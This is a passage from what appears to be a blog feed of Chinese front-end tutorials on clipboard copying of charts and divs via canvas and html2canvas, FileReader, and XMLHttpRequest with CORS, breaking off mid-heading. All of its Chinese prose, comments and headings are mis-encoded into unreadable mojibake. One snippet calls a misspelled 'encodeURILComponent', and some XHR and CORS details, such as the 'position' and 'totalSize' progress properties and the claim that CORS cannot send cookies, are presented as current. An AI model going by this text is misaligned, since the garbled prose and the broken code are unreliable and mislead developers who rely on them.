class="keyword">if</span> (title) &#123;</span><br><span class="line">        context.fillStyle = <span class="string">'rgba(13,13,13,0.9)'</span></span><br><span class="line">        context.font = <span class="string">'14px Arial'</span></span><br><span class="line">        <span class="keyword">const</span> textWidth = context.measureText(title).width</span><br><span class="line">        <span class="keyword">const</span> x = (canvas.width - textWidth) / <span class="number">2</span></span><br><span class="line">        context.fillText(title, x, <span class="number">30</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      context.drawImage(image, <span class="number">16</span>, title ? <span class="number">50</span> : <span class="number">16</span>, chartWidth, chartHeight)</span><br><span class="line"></span><br><span class="line">      <span class="comment">// å°†canvaså›¾åƒè½¬æ¢ä¸ºå›¾ç‰‡æ–‡ä»¶</span></span><br><span class="line">      canvas.toBlob(</span><br><span class="line">        <span class="keyword">async</span> blob =&gt; &#123;</span><br><span class="line">          <span class="keyword">return</span> resolve(blob)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'image/png'</span>,</span><br><span class="line">        <span class="number">0.5</span></span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¤åˆ¶svgå›¾è¡¨</span></span><br><span class="line"><span class="keyword">const</span> res = <span class="keyword">await</span> getChartBlob(<span class="string">'å›¾è¡¨æ ‡é¢˜'</span>)</span><br><span class="line">copyBlob(res)</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-2-å¤åˆ¶-div-ä¸ºå›¾ç‰‡"><a href="#2-2-å¤åˆ¶-div-ä¸ºå›¾ç‰‡" class="headerlink" title="2.2 å¤åˆ¶ div ä¸ºå›¾ç‰‡"></a>2.2 å¤åˆ¶ div ä¸ºå›¾ç‰‡</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> html2canvas <span class="keyword">from</span> <span class="string">'html2canvas'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">getTableBlob</span>(<span class="params"></span>): <span class="title">Promise</span>&lt;<span class="title">Blob</span> | <span class="title">null</span>&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="keyword">async</span> resolve =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> table = <span class="built_in">document</span>.getElementsByClassName(<span class="string">'base-table'</span>)[<span class="number">0</span>] <span class="keyword">as</span> HTMLElement</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†å›¾ç‰‡æ•°æ®URLæ”¾åˆ°ç²˜è´´æ¿ä¸Š</span></span><br><span class="line">    <span class="keyword">const</span> canvas = <span class="keyword">await</span> html2canvas(table)</span><br><span class="line">    canvas.toBlob(</span><br><span class="line">      <span class="keyword">async</span> blob =&gt; &#123;</span><br><span class="line">        resolve(blob)</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">'image/png'</span>,</span><br><span class="line">      <span class="number">0.9</span></span><br><span class="line">    )</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> res = <span class="keyword">await</span> getTableBlob()</span><br><span class="line">copyBlob(res)</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-3-å¤åˆ¶æ–‡æœ¬"><a href="#2-3-å¤åˆ¶æ–‡æœ¬" class="headerlink" title="2.3 å¤åˆ¶æ–‡æœ¬"></a>2.3 å¤åˆ¶æ–‡æœ¬</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">copyText</span>(<span class="params">text: string</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">const</span> tempEl = <span class="built_in">document</span>.createElement(<span class="string">'textarea'</span>)</span><br><span class="line">  tempEl.value = text</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(tempEl)</span><br><span class="line">  tempEl.select()</span><br><span class="line">  <span class="built_in">document</span>.execCommand(<span class="string">'copy'</span>)</span><br><span class="line">  <span class="built_in">document</span>.body.removeChild(tempEl)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-FileReader"><a href="#3-FileReader" class="headerlink" title="3. FileReader"></a>3. FileReader</h3><h4 id="3-1-è¯»å–æ–‡ä»¶æ–‡æœ¬å†…å®¹"><a href="#3-1-è¯»å–æ–‡ä»¶æ–‡æœ¬å†…å®¹" class="headerlink" title="3.1 è¯»å–æ–‡ä»¶æ–‡æœ¬å†…å®¹"></a>3.1 è¯»å–æ–‡ä»¶æ–‡æœ¬å†…å®¹</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'textFileInput'</span>).addEventListener(<span class="string">'change'</span>, (event) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> file = event.target.files[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> (file) &#123;</span><br><span class="line">    <span class="keyword">const</span> reader = <span class="keyword">new</span> FileReader();</span><br><span class="line"></span><br><span class="line">    reader.onload = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">document</span>.getElementById(<span class="string">'textContent'</span>).textContent = e.target.result;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    reader.onerror = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      alert(<span class="string">'æ–‡ä»¶è¯»å–å¤±è´¥ï¼'</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    reader.readAsText(file);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-2-è¯»å–å›¾ç‰‡å¹¶é¢„è§ˆ"><a href="#3-2-è¯»å–å›¾ç‰‡å¹¶é¢„è§ˆ" class="headerlink" title="3.2 è¯»å–å›¾ç‰‡å¹¶é¢„è§ˆ"></a>3.2 è¯»å–å›¾ç‰‡å¹¶é¢„è§ˆ</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'imageFileInput'</span>).addEventListener(<span class="string">'change'</span>, (event) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> file = event.target.files[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> (file &amp;&amp; file.type.startsWith(<span class="string">'image/'</span>)) &#123;</span><br><span class="line">    <span class="keyword">const</span> reader = <span class="keyword">new</span> FileReader();</span><br><span class="line"></span><br><span class="line">    reader.onload = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">      img.src = e.target.result;</span><br><span class="line">      img.alt = <span class="string">'é¢„è§ˆå›¾ç‰‡'</span>;</span><br><span class="line">      img.width = <span class="number">300</span>;</span><br><span class="line">      <span class="built_in">document</span>.getElementById(<span class="string">'imagePreview'</span>).appendChild(img);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    reader.onerror = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      alert(<span class="string">'å›¾ç‰‡åŠ è½½å¤±è´¥ï¼'</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    reader.readAsDataURL(file);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    alert(<span class="string">'è¯·é€‰æ‹©ä¸€å¼ å›¾ç‰‡æ–‡ä»¶ã€‚'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.cn/post/7444467218070323210?searchId=20241229213222203B42E54AFE0FF45949" target="_blank" rel="noopener">å‰ç«¯Blobã€Fileã€FileReaderã€ArrayBufferå‚»å‚»åˆ†ä¸æ¸…</a></li></ul>]]></content>
      
      <categories>
          
          <category> HTTP </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>XHRï¼šå®ç°ä¸€ä¸ªAxios</title>
      <link href="/2022/06/26/Axios/"/>
      <url>/2022/06/26/Axios/</url>
      <content type="html"><![CDATA[<h3 id="1-Ajax"><a href="#1-Ajax" class="headerlink" title="1. Ajax"></a>1. Ajax</h3><h4 id="1-1-å‘é€è¯·æ±‚"><a href="#1-1-å‘é€è¯·æ±‚" class="headerlink" title="1.1 å‘é€è¯·æ±‚"></a>1.1 å‘é€è¯·æ±‚</h4><p>åˆ›å»ºXHRå¯¹è±¡åï¼Œç”¨çš„ç¬¬ä¸€ä¸ªæ–¹æ³•æ˜¯open()ï¼Œopenæ–¹æ³•ä¸ä¼šçœŸæ­£å‘é€è¯·æ±‚ï¼Œè€Œåªæ˜¯å¯åŠ¨ä¸€ä¸ªè¯·æ±‚å·²å¤‡å‘é€ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">'get'</span>, <span class="string">'example.php'</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">'MyHeader'</span>, <span class="string">'MyValue'</span>);</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-2-ç›‘å¬è¯·æ±‚çŠ¶æ€"><a href="#1-2-ç›‘å¬è¯·æ±‚çŠ¶æ€" class="headerlink" title="1.2 ç›‘å¬è¯·æ±‚çŠ¶æ€"></a>1.2 ç›‘å¬è¯·æ±‚çŠ¶æ€</h4><p>XHRçš„<em><code>readyState</code></em>å±æ€§ï¼Œè¡¨ç¤ºè¯·æ±‚/å“åº”è¿‡ç¨‹çš„å½“å‰æ´»åŠ¨é˜¶æ®µã€‚åªè¦readyStateå±æ€§çš„å€¼ç”±ä¸€ä¸ªå€¼å˜æˆå¦ä¸€ä¸ªå€¼ï¼Œéƒ½ä¼šè§¦å‘ä¸€æ¬¡<em><code>readystatechange</code></em>äº‹ä»¶ã€‚</p><ul><li>0: æœªåˆå§‹åŒ–ï¼Œå°šæœªè°ƒç”¨open()æ–¹æ³•</li><li>1: å¯åŠ¨ï¼Œå·²ç»è°ƒç”¨open()æ–¹æ³•ï¼Œä½†å°šæœªè°ƒç”¨send()æ–¹æ³•</li><li>2: å‘é€ï¼Œå·²ç»è°ƒç”¨send()æ–¹æ³•ï¼Œ å½“å°šæœªæ¥æ”¶åˆ°å“åº”</li><li>3: æ¥æ”¶ï¼Œå·²ç»æ¥æ”¶åˆ°éƒ¨åˆ†å“åº”æ•°æ®</li><li>4: å®Œæˆï¼Œå·²ç»æ¥æ”¶åˆ°å…¨éƒ¨å“åº”æ•°æ®ï¼Œè€Œä¸”å·²ç»å¯ä»¥åœ¨å®¢æˆ·ç«¯ä½¿ç”¨äº†ã€‚</li></ul><p><br></p><h4 id="1-3-è¯»å–è¿”å›å†…å®¹"><a href="#1-3-è¯»å–è¿”å›å†…å®¹" class="headerlink" title="1.3 è¯»å–è¿”å›å†…å®¹"></a>1.3 è¯»å–è¿”å›å†…å®¹</h4><p>è¯·æ±‚å‘å‡ºåï¼Œjavascriptä»£ç ä¼šç­‰åˆ°æœåŠ¡å™¨å“åº”ä¹‹åå†ç»§ç»­æ‰§è¡Œã€‚åœ¨æ”¶åˆ°å“åº”åï¼Œ<em><code>xhr.readyState == 4</code></em>, å“åº”çš„æ•°æ®ä¼šè‡ªåŠ¨å¡«å……XHRå¯¹è±¡çš„å±æ€§ã€‚ç›¸å…³å±æ€§</p><ul><li>xhr.responseText: ä½œä¸ºå“åº”ä¸»é¢˜è¢«è¿”å›çš„æ–‡æœ¬</li><li>xhr.responseXML: å¦‚æœå“åº”çš„å†…å®¹ç±»å‹æ˜¯text/xml, application/xmlï¼Œè¿™ä¸ªå±æ€§ä¸­å°†ä¿å­˜åŒ…å«ç€å“åº”æ•°æ®çš„XML DOMæ–‡æ¡£</li><li>xhr.status: å“åº”çš„HTTPçŠ¶æ€</li><li>xhr.statusText: HTTPçŠ¶æ€çš„è¯´æ˜</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.status &gt;= <span class="number">200</span> &amp;&amp; xhr.status &lt; <span class="number">300</span> || xhr.status == <span class="number">304</span>) &#123;</span><br><span class="line">      alert(xhr.responseText)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      alert(<span class="string">"Request was unsuccessful:"</span> + xhr.status )</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-4-å–æ¶ˆè¯·æ±‚"><a href="#1-4-å–æ¶ˆè¯·æ±‚" class="headerlink" title="1.4 å–æ¶ˆè¯·æ±‚"></a>1.4 å–æ¶ˆè¯·æ±‚</h4><p>åœ¨æ¥æ”¶åˆ°å“åº”ä¹‹å‰ï¼Œè¿˜å¯ä»¥è°ƒç”¨<em><code>xhr.abort()</code></em>æ–¹æ³•æ¥å–æ¶ˆå¼‚æ­¥è¯·æ±‚ã€‚</p><p><br></p><h4 id="1-5-è®¾ç½®è¯·æ±‚å¤´"><a href="#1-5-è®¾ç½®è¯·æ±‚å¤´" class="headerlink" title="1.5 è®¾ç½®è¯·æ±‚å¤´"></a>1.5 è®¾ç½®è¯·æ±‚å¤´</h4><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨å‘é€XHRè¯·æ±‚çš„åŒæ—¶ï¼Œä¼šå‘é€ä¸‹åˆ—å¤´éƒ¨ä¿¡æ¯ã€‚</p><ul><li>Accept: æµè§ˆå™¨èƒ½å¤Ÿå¤„ç†çš„å†…å®¹ç±»å‹</li><li>Accept-Charset: æµè§ˆå™¨èƒ½å¤Ÿæ˜¾ç¤ºçš„å­—ç¬¦é›†</li><li>Accept-Encoding: æµè§ˆå™¨èƒ½å¤Ÿå¤„ç†çš„å‹ç¼©ç¼–ç </li><li>Accept-Language: æµè§ˆå™¨å½“å‰è®¾ç½®çš„è¯­è¨€</li><li>Connection: æµè§ˆå™¨ä¸æœåŠ¡å™¨ä¹‹é—´è¿æ¥çš„ç±»å‹</li><li>Cookie: å½“å‰é¡µé¢è®¾ç½®çš„ä»»ä½•cookie</li><li>Host: å‘å‡ºè¯·æ±‚çš„é¡µé¢æ‰€åœ¨çš„åŸŸ</li><li>Referer: å‘å‡ºè¯·æ±‚çš„é¡µé¢çš„URI</li><li>User-Agent: æµè§ˆå™¨çš„ç”¨æˆ·ä»£ç†å­—ç¬¦ä¸²</li></ul><p>æœ‰çš„æµè§ˆå™¨å…è®¸å¼€å‘äººå‘˜é‡å†™é»˜è®¤çš„å¤´éƒ¨ä¿¡æ¯ï¼Œæœ‰çš„æµè§ˆå™¨ä¸å…è®¸è¿™æ ·åšã€‚å»ºè®®ä½¿ç”¨è‡ªå®šä¹‰çš„å¤´éƒ¨å­—æ®µï¼Œå¦åˆ™æœ‰å¯èƒ½ä¼šå½±å“æœåŠ¡å™¨çš„å“åº”ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è®¾ç½®è¯·æ±‚å¤´</span></span><br><span class="line">xhr.setRequestHeader(<span class="string">'myHeader'</span>, <span class="string">'myValue'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–å“åº”å¤´éƒ¨ä¿¡æ¯</span></span><br><span class="line"><span class="keyword">var</span> myHeader = xhr.getResponseHeader(<span class="string">'myHeader'</span>);</span><br><span class="line"><span class="keyword">var</span> allHeaders = xhr.getAllResponseHeaders();  <span class="comment">// è¿”å›å¤šè¡Œæ–‡æœ¬å†…å®¹</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-5-GET-POST"><a href="#1-5-GET-POST" class="headerlink" title="1.5 GET/POST"></a>1.5 GET/POST</h4><ul><li><p>GETè¯·æ±‚<br>GETè¯·æ±‚ï¼Œå°†æŸ¥è¯¢å­—ç¬¦ä¸²å‚æ•°è¿½åŠ åˆ°urlçš„æœ«å°¾ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²çš„æ¯ä¸ªå‚æ•°key,valueéƒ½éœ€ä½¿ç”¨<em><code>encodeURIComponent()</code></em>è¿›è¡Œç¼–ç ã€‚æ‰€æœ‰é”®å€¼å¯¹éœ€ç”± &amp; åˆ†éš”ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¯¹äº';/?:@&amp;=+$,#è¿™äº›å­—ç¬¦ï¼Œåœ¨encodeURIComponentä¸­ç»Ÿç»Ÿä¼šè¢«ç¼–ç ã€‚</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addURLParam</span>(<span class="params">url, key, value</span>) </span>&#123;</span><br><span class="line">  url += (url.indexOf(<span class="string">"?"</span>) == <span class="number">-1</span> ? <span class="string">"?"</span> : <span class="string">"&amp;"</span>);</span><br><span class="line">  url += <span class="built_in">encodeURIComponent</span>(key) + <span class="string">'='</span> + encodeURILComponent(value);</span><br><span class="line">  <span class="keyword">return</span> url</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> url = <span class="string">'example.php'</span>;</span><br><span class="line">url = addURLParam(url, <span class="string">"name"</span>, <span class="string">"Nicholas"</span>);</span><br><span class="line">url = addURLParam(url, <span class="string">"book"</span>, <span class="string">"Marketing"</span>);</span><br><span class="line"></span><br><span class="line">xhr.open(<span class="string">'get'</span>, url, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure></li><li><p>POSTè¯·æ±‚<br>POSTè¯·æ±‚æŠŠæ•°æ®ä½œä¸ºè¯·æ±‚çš„ä¸»ä½“æäº¤ï¼Œæ•°æ®é€šè¿‡<code>xhr.send(data)</code>ä¼ å…¥ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// formData</span></span><br><span class="line"><span class="comment">// Content-type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="keyword">var</span> data = <span class="keyword">new</span> FormData();</span><br><span class="line">data.append(<span class="string">'name'</span>, <span class="string">'Nicholas'</span>);</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">'post'</span>, <span class="string">'postexample.php'</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">xhr.send(data);</span><br><span class="line"></span><br><span class="line"><span class="comment">// json</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="1-6-è¿›åº¦äº‹ä»¶"><a href="#1-6-è¿›åº¦äº‹ä»¶" class="headerlink" title="1.6 è¿›åº¦äº‹ä»¶"></a>1.6 è¿›åº¦äº‹ä»¶</h4><ul><li>loadstart: åœ¨æ¥æ”¶åˆ°å“åº”æ•°æ®çš„ç¬¬ä¸€å­—èŠ‚æ—¶è§¦å‘</li><li>error: åœ¨è¯·æ±‚å‘ç”Ÿé”™è¯¯æ—¶è§¦å‘</li><li>abort: è°ƒç”¨abort()åè§¦å‘</li><li>load: åœ¨æ¥æ”¶åˆ°å®Œæ•´çš„å“åº”æ•°æ®æ—¶è§¦å‘</li><li>loadend: é€šä¿¡å®Œæˆï¼Œæˆ–è§¦å‘error, abort, loadäº‹ä»¶åè§¦å‘</li><li>progress: åœ¨æ¥æ”¶å“åº”æœŸé—´æŒç»­ä¸æ–­åœ°è§¦å‘ã€‚äº‹ä»¶ä¼šæ”¶åˆ°ä¸€ä¸ªeventå¯¹è±¡ï¼Œå…¶targetå±æ€§æ˜¯xhrå¯¹è±¡ï¼ŒåŒ…å«ç€ä¸‰ä¸ªé¢å¤–çš„å±æ€§: </li></ul><p><em><code>lengthComputable</code></em> è¿›åº¦ä¿¡æ¯æ˜¯å¦å¯ç”¨çš„å¸ƒå°”å€¼,<br><em><code>position</code></em> å·²ç»æ¥æ”¶åˆ°çš„å­—èŠ‚æ•°,<br><em><code>totalSize</code></em> æ ¹æ®Content-lengthå“åº”å¤´éƒ¨ç¡®å®šçš„é¢„æœŸå­—èŠ‚æ•°ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xhr.onprogress = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> divStatus = <span class="built_in">document</span>.getElementById(<span class="string">'status'</span>);</span><br><span class="line">  <span class="keyword">if</span> (event.lengthComputable) &#123;</span><br><span class="line">    divStatus.innerHTML = <span class="string">"Received"</span> + event.position + <span class="string">"of"</span> + event.totalSize + <span class="string">"bytes"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-7-è·¨åŸŸè¯·æ±‚"><a href="#1-7-è·¨åŸŸè¯·æ±‚" class="headerlink" title="1.7 è·¨åŸŸè¯·æ±‚"></a>1.7 è·¨åŸŸè¯·æ±‚</h4><h5 id="1-7-1-CORS"><a href="#1-7-1-CORS" class="headerlink" title="1.7.1 CORS"></a>1.7.1 CORS</h5><p>CORS(Cross-Origin Resource Sharing, è·¨æºèµ„æºå…±äº«), åœ¨å‘é€è¯·æ±‚æ—¶ï¼Œé™„åŠ ä¸€ä¸ªOriginè¯·æ±‚å¤´ï¼Œå€¼ä¸ºè¯·æ±‚é¡µé¢çš„æºä¿¡æ¯(åè®®ï¼ŒåŸŸåå’Œç«¯å£)ï¼Œä»¥ä¾¿æœåŠ¡å™¨æ ¹æ®è¿™ä¸ªå¤´éƒ¨ä¿¡æ¯æ¥å†³å®šæ˜¯å¦ç»™äºˆå“åº”ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"Origin"</span>, <span class="string">"http://www.nczonline.net"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Firefox, safari, chromeæ— éœ€é¢å¤–ç¼–å†™ä»£ç ï¼Œå°±å¯ä»¥è§¦å‘CORSè¡Œ, IEè¦ç”¨XDRå¯¹è±¡</span></span><br><span class="line"><span class="comment">// xhr.open()é‡Œä¼ å…¥ç»å¯¹url</span></span><br><span class="line">xhr.open(<span class="string">"get"</span>, <span class="string">"http://www.somewhere-else.com/page/"</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure></p><p>å¦‚æœæœåŠ¡å™¨è®¤ä¸ºè¿™ä¸ªè¯·æ±‚å¯ä»¥æ¥å—ï¼Œå°±åœ¨<em><code>Access-Control-Allow-Origin</code></em>å¤´éƒ¨ä¸­è¿”å›ç›¸åŒçš„æºä¿¡æ¯ã€‚æ³¨æ„ï¼šè¯·æ±‚å’Œå“åº”éƒ½ä¸åŒ…å«cookieä¿¡æ¯ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://www.nczonline.net</span><br></pre></td></tr></table></figure></p><p>CORSå­˜åœ¨ä¸€äº›å®‰å…¨é™åˆ¶</p><ul><li>ä¸èƒ½ä½¿ç”¨setRequestHeader()è®¾ç½®è‡ªå®šä¹‰å¤´éƒ¨</li><li>ä¸èƒ½å‘é€å’Œæ¥æ”¶cookie</li><li>è°ƒç”¨getAllResponseHeaders()æ–¹æ³•æ€»ä¼šè¿”å›ç©ºå­—ç¬¦ä¸²</li></ul><p><br></p><h5 id="1-7-2-Preflighted-Request"><a href="#1-7-2-Preflighted-Request" class="headerlink" title="1.7.2 Preflighted Request"></a>1.7.2 Preflighted Request</h5><p>CORS é€šè¿‡ä¸€ç§å«åš Preflighted Requests çš„é€æ˜æœåŠ¡å™¨éªŒè¯æœºåˆ¶<em>æ”¯æŒå¼€å‘äººå‘˜ä½¿ç”¨è‡ªå®šä¹‰çš„å¤´éƒ¨ã€ GET æˆ– POST ä¹‹å¤–çš„æ–¹æ³•ï¼Œä»¥åŠä¸åŒç±»å‹çš„ä¸»ä½“å†…å®¹</em>ã€‚åœ¨ä½¿ç”¨ä¸‹åˆ—é«˜çº§é€‰é¡¹æ¥å‘é€è¯·æ±‚æ—¶ï¼Œå°±ä¼šå‘æœåŠ¡ å™¨å‘é€ä¸€ä¸ª Preflight è¯·æ±‚ã€‚è¿™ç§è¯·æ±‚ä½¿ç”¨ OPTIONS æ–¹æ³•ï¼Œå‘é€ä¸‹åˆ—å¤´éƒ¨ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Origin:ä¸ç®€å•çš„è¯·æ±‚ç›¸åŒã€‚</span><br><span class="line">Access-Control-Request-Method:è¯·æ±‚è‡ªèº«ä½¿ç”¨çš„æ–¹æ³•ã€‚</span><br><span class="line">Access-Control-Request-Headers:(å¯é€‰)è‡ªå®šä¹‰çš„å¤´éƒ¨ä¿¡æ¯ï¼Œå¤šä¸ªå¤´éƒ¨ä»¥é€—å·åˆ†éš”ã€‚</span><br></pre></td></tr></table></figure></p><p>æœåŠ¡å™¨é€šè¿‡å“åº”ä¸­è¿”å›å¦‚ä¸‹å¤´éƒ¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin:ä¸ç®€å•çš„è¯·æ±‚ç›¸åŒã€‚</span><br><span class="line">Access-Control-Allow-Methods:å…è®¸çš„æ–¹æ³•ï¼Œå¤šä¸ªæ–¹æ³•ä»¥é€—å·åˆ†éš”ã€‚</span><br><span class="line">Access-Control-Allow-Headers:å…è®¸çš„å¤´éƒ¨ï¼Œå¤šä¸ªå¤´éƒ¨ä»¥é€—å·åˆ†éš”ã€‚</span><br><span class="line">Access-Control-Max-Age:åº”è¯¥å°†è¿™ä¸ª Preflight è¯·æ±‚ç¼“å­˜å¤šé•¿æ—¶é—´(ä»¥ç§’è¡¨ç¤º)ã€‚</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="1-7-3-withCredentials"><a href="#1-7-3-withCredentials" class="headerlink" title="1.7.3 withCredentials"></a>1.7.3 